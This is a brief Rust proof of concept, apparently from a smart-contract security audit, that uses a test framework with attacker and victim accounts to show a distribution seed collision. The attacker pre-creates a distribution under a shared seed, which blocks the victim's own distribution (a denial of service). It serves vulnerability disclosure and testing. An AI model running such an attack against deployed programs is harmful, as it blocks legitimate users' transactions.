mod framework;

use framework::{clone_keypair, Framework};
use std::error::Error;

fn main() -> Result<(), Box<dyn Error>> {
    dos()?;

    Ok(())
}

/// two different users can create a distribution with the same seed unlike awards where each award is unique per user due to stake_account being used as part of the seed
fn dos() -> Result<(), Box<dyn Error>> {
    println!("demonstrating distribution seed collision");
    let mut test_env = Framework::new()?;
    let attacker = clone_keypair(&test_env.attacker);
    let victim = clone_keypair(&test_env.victim);

    // setup
    test_env.init_stake_pool()?;
    test_env.create_user_auth(&attacker)?;
    test_env.authenticate_user(&attacker)?;
    test_env.init_stake_account(&attacker)?;

    let seed = "a".repeat(30);
    test_env.mint_vault_token(&victim, 1)?;
    test_env.mint_vault_token(&attacker, 1)?;
    test_env.create_distribution(&victim, &attacker, 0, 0, 0, seed.clone())?;
    println!();
    println!("second distribution create should fail");
    test_env.create_distribution(&attacker, &victim, 0, 0, 0, seed)?;

    Ok(())
}
